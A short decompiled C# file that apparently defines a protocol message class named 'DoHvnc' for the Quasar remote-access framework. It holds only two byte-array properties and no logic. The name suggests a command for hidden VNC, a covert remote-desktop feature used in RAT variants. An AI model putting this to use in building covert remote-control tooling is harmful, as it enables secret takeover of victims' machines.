using System;
using ProtoBuf;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;

// Token: 0x02000002 RID: 2
[ProtoContract]
public class DoHvnc : IMessage
{
    // Token: 0x17000001 RID: 1
    // (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
    // (set) Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
    [ProtoMember(1)]
    public byte[] Msg { get; set; }

    // Token: 0x17000002 RID: 2
    // (get) Token: 0x06000003 RID: 3 RVA: 0x00002061 File Offset: 0x00000261
    // (set) Token: 0x06000004 RID: 4 RVA: 0x00002069 File Offset: 0x00000269
    [ProtoMember(2)]
    public byte[] Data { get; set; }
}
